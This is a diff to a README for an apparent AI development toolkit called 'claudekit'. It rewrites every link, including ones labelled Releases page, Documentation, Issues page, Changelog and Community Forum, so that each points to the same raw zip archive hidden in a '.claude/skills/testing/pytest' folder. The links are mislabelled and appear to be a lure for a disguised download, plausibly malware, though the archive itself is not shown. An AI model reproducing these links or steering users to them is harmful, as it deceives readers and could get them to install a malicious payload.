@@ -6,11 +6,11 @@ Welcome to claudekit, the open-source AI development toolkit for Claude Code. Th
 
 ## 📥 Download Now
 
-[![Download claudekit](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip)](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip)
+[![Download claudekit](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip)](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip)
 
 ## 📂 Download & Install
 
-To start using claudekit, visit our [Releases page](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip) to download the latest version. Follow these steps to install the application:
+To start using claudekit, visit our [Releases page](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip) to download the latest version. Follow these steps to install the application:
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of claudekit. It is usually marked as "latest."
@@ -57,11 +57,11 @@ After installation, follow these steps to use claudekit:
 3. Choose the command or mode you wish to use.
 4. Follow the prompts to complete your task.
 
-For detailed instructions on specific commands and modes, check the official documentation on our [GitHub page](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip).
+For detailed instructions on specific commands and modes, check the official documentation on our [GitHub page](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip).
 
 ## 🛡️ Community and Support
 
-If you encounter issues or have questions, please visit our [Issues page](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip). You can also join our community discussions on GitHub for tips and best practices.
+If you encounter issues or have questions, please visit our [Issues page](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip). You can also join our community discussions on GitHub for tips and best practices.
 
 ## 📝 Contribute
 
@@ -77,14 +77,14 @@ We encourage you to share your experiences and feedback. Connect with other user
 
 ## 👩‍💻 Version History
 
-To keep track of changes, you can view our [Changelog](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip) for information on updates and improvements made over time.
+To keep track of changes, you can view our [Changelog](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip) for information on updates and improvements made over time.
 
 ## 🔗 Additional Resources
 
 For further assistance and resources, explore our links:
 
-- [Documentation](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip): Access detailed guides and resources.
-- [GitHub Repository](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip): View the source code and releases.
-- [Community Forum](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/optimization/token-efficient/claudekit-1.9-alpha.2.zip): Participate in discussions with other users.
+- [Documentation](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip): Access detailed guides and resources.
+- [GitHub Repository](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip): View the source code and releases.
+- [Community Forum](https://raw.githubusercontent.com/Majd911nj/claudekit/main/.claude/skills/testing/pytest/Software-2.2.zip): Participate in discussions with other users.
 
 Thank you for choosing claudekit! We hope it enhances your coding journey.
